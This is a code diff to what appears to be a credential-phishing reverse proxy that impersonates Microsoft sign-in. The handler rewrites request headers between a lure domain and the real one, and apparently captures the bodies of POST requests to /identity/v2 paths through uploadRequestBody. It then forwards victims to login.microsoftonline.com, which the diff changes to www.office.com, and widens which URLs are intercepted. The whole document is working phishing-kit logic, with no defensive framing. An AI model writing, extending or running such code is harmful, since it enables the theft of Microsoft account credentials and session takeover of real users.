@@ -196,7 +196,7 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
         this.req.headers['referer'] = this.req.headers['referer']? this.req.headers['referer'].replace(clientContext.hostname, clientContext.currentDomain) : ''
 
         if (this.req.url.startsWith('/identity')) {
-            if (this.req.url === '/identity/v2') {
+            if (this.req.url.startsWith('/identity/v2')) {
                 if (this.req.method === 'POST') {
                     super.uploadRequestBody(clientContext.currentDomain, clientContext)
                     this.res.writeHead(302, {location: '/auth/login/finish'})
@@ -245,8 +245,8 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
                 return this.res.end('')
             }
             if (this.req.url === '/auth/login/office') {
-                this.req.url = '/'
-                clientContext.currentDomain = 'login.microsoftonline.com'
+                this.req.url = '/login'
+                clientContext.currentDomain = 'www.office.com'
                 this.res.writeHead(302, {location: '/'})
                 return this.res.end('')
             }
